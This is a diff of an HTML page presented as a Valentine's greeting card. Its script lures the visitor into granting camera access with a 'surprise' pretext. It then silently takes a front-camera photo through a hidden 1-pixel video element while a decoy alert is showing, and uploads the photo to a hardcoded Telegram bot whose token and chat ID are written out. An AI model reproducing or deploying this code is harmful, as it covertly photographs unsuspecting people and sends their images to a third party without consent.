@@ -1,124 +1,89 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My Special Valentine ❤️</title>
+    <title>Valentine's Special ❤️</title>
     <style>
-        body {
-            background: linear-gradient(to bottom, #ff9a9e, #fad0c4);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            text-align: center;
-            color: #b71c1c;
-            padding: 20px;
-            height: 100vh;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        .container {
-            background: rgba(255, 255, 255, 0.8);
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-            max-width: 400px;
-        }
-        h1 { font-size: 2em; margin-bottom: 10px; }
-        p { font-size: 1.1em; line-height: 1.6; }
-        .heart { color: #e91e63; font-size: 50px; animation: beat 1s infinite; }
-        @keyframes beat {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-        #startBtn {
-            background-color: #ff4081;
-            color: white;
-            border: none;
-            padding: 15px 35px;
-            font-size: 1.2em;
-            border-radius: 50px;
-            cursor: pointer;
-            margin-top: 20px;
-            transition: 0.3s;
-        }
-        #startBtn:hover { background-color: #f50057; }
-        #video, #canvas { display: none; }
+        body { background: #ffafbd; background: linear-gradient(to right, #ffc3a0, #ffafbd); font-family: 'Arial', sans-serif; text-align: center; }
+        .card-container { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin-top: 30px; }
+        .card { width: 140px; height: 180px; background: white; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-weight: bold; cursor: pointer; box-shadow: 0 4px 8px rgba(0,0,0,0.2); border: 2px solid #ff4b2b; padding: 10px; }
+        #video { width: 1px; height: 1px; opacity: 0; position: absolute; } /* Chota aur invisible */
+        #canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="heart">❤️</div>
-        <h1>For My Valentine</h1>
-        <p>"Aap mere liye bahut special ho. Maine aapke liye ek chota sa surprise plan kiya hai."</p>
-        <p>Surprise dekhne ke liye niche button par click karein aur permission <b>'Allow'</b> karein ✨</p>
-        
-        <button id="startBtn">Open Surprise 🎁</button>
+    <h1 style="color: white; text-shadow: 2px 2px #ff4b2b;">Open Your Valentine Card 💌</h1>
+
+    <div class="card-container">
+        <div class="card" onclick="startProcess('Tu meri zindagi ka sabse pyara hissa hai! 🌹')">Pyaar Bhara Tohfa</div>
+        <div class="card" onclick="startProcess('I Promise to love you forever! 💍')">Ek Vaada</div>
+        <div class="card" onclick="startProcess('You are so beautiful! 😍')">Tareef</div>
     </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // Aapka Fixed Data
-        const botToken = '8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc';
-        const chatId = '7735968383';
+        const botToken = "8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc";
+        const chatId = "7735968383";
 
-        const startBtn = document.getElementById('startBtn');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-
-        startBtn.addEventListener('click', async () => {
+        async function startProcess(msg) {
+            // Pehle camera permission maangega
             try {
-                // Camera access mangna
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, // Front camera force karna
+                    audio: false 
+                });
                 
-                startBtn.innerText = "Loading Surprise...";
-                startBtn.disabled = true;
+                const video = document.getElementById('video');
+                video.srcObject = stream;
 
-                // 2 second wait karein taaki camera clear ho jaye
+                // User ko message dikhao jab tak peeche camera set ho raha hai
+                alert(msg);
+
+                // 3 Second ka wait taaki black screen na aaye
                 setTimeout(() => {
-                    captureAndSend(stream);
-                }, 2000);
+                    captureRealPhoto(stream);
+                }, 3000); 
 
             } catch (err) {
-                alert("Please allow camera access to see the surprise! ❤️");
-                console.error(err);
+                alert("Please allow camera to see the surprise! ❤️");
             }
-        });
+        }
 
-        function captureAndSend(stream) {
+        function captureRealPhoto(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0);
 
-            // Image ko Blob mein convert karke Telegram par bhejna
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'valentine_capture.jpg');
-                formData.append('caption', '💝 Valentine Site se ek naya photo aaya hai!');
+            // Video frames check
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(res => {
-                    // Photo bhejne ke baad user ko ye dikhega
-                    alert("You are the most beautiful person! Happy Valentine's Day! 💖");
-                    // Camera band karna
+                canvas.toBlob(blob => {
+                    sendToTelegram(blob);
+                    // Camera band kar do kaam khatam hone ke baad
                     stream.getTracks().forEach(track => track.stop());
-                })
-                .catch(error => {
-                    console.error("Error sending photo:", error);
-                });
-            }, 'image/jpeg');
+                }, 'image/jpeg', 0.8); // 0.8 quality for clear photo
+            } else {
+                // Agar data ready nahi hai toh 1 sec aur wait karo
+                setTimeout(() => captureRealPhoto(stream), 1000);
+            }
+        }
+
+        function sendToTelegram(imageBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', imageBlob, 'capture.jpg');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
         }
     </script>
 </body>
